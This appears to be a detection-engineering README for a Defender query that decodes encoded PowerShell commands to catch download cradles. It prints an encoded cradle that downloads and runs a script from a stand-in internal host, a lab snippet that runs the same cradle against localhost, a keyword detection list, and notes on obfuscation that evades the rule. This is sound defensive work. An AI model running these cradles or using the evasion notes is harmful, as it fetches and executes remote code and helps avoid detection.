# Encoded PowerShell download cradle

| | |
|---|---|
| **Rule** | [`rule.yaml`](rule.yaml) |
| **Data** | `DeviceProcessEvents` (Defender for Endpoint) |
| **ATT&CK** | T1059.001 PowerShell, T1027.010 Command Obfuscation, T1105 Ingress Tool Transfer |
| **Severity** | High |
| **Runs** | Hourly over 1 hour |

## Goal
Decode `-EncodedCommand` and alert when the hidden command downloads or runs remote code.

## How it works
Alerting on every `-enc` is too noisy, because SCCM, Intune and lots of admin scripts use it. Searching the raw command line for keywords misses everything that's encoded. So the rule decodes the command inside the query:

1. Find PowerShell processes (by file name or original file name, so renamed binaries count) where the command line has `-e`, `-ec`, `-enc` … `-EncodedCommand` (any short form PowerShell accepts, with `-` or `/`) followed by a base64 string.
2. Pull out the base64, decode it with `base64_decode_tostring()` and strip the `\x00` bytes. PowerShell encodes as UTF-16LE, so every other byte is null.
3. Alert if the decoded text has a download or in-memory execution method in it: `Net.WebClient`, `DownloadString`, `Invoke-WebRequest`/`iwr`, `Invoke-RestMethod`, BITS, `IEX`, `FromBase64String`, `Reflection.Assembly` or `-bxor`.
4. Pull any URLs out of the decoded command for the analyst and for the URL entity mapping.

The decoded command is in the `Decoded` column, so the analyst can read it straight away.

## Technical context
- Example that fires:
  `powershell -NoP -W Hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAiAGgAdAB0AHAAOgAvAC8AMQAwAC4AMAAuADAALgA1AC8AYQAuAHAAcwAxACIAKQA=`
  decodes to `IEX (New-Object Net.WebClient).DownloadString("http://10.0.0.5/a.ps1")`.
- Payloads encoded twice still match, through the `frombase64string` keyword.

## Blind spots
- Obfuscation inside the decoded text: string concatenation (`'Down'+'loadString'`), backticks, `-join`, char arrays. Invoke-Obfuscation output can get past the keyword list. AMSI or script block logging in `DeviceEvents` covers more of this where you have it.
- Cradles that don't use `-EncodedCommand`: plain `-Command`, input piped in, or `.ps1` files on disk. A sibling rule on plain `-Command` with the same keywords would cover the first one.
- PowerShell hosted inside another process (`System.Management.Automation.dll` loaded by something else).

## False positives
- Management agents like SCCM (`ccmexec.exe`), the Intune Management Extension and some RMM tools, which use encoded commands to download their own content. Add the parent to `trustedParents`, and check the URL points at your own infrastructure.
- Installer bootstrap scripts (Chocolatey, some vendor installers) run by IT.

## Validation
On a lab host:
```powershell
$c = 'IEX (New-Object Net.WebClient).DownloadString("http://127.0.0.1/x")'
powershell -enc ([Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($c)))
```
You should get one alert. `Decoded` shows the cradle and `FirstUrl` is `http://127.0.0.1/x`.

## Response
1. Read `Decoded`, then fetch what's at the URL safely (sandbox or threat intel) to see the next stage.
2. Check the parent chain. An Office app starting PowerShell points to phishing. `wmiprvse` or `services` points to remote execution or persistence.
3. If the next stage downloaded, isolate the host and search for the same URL or domain across the estate.
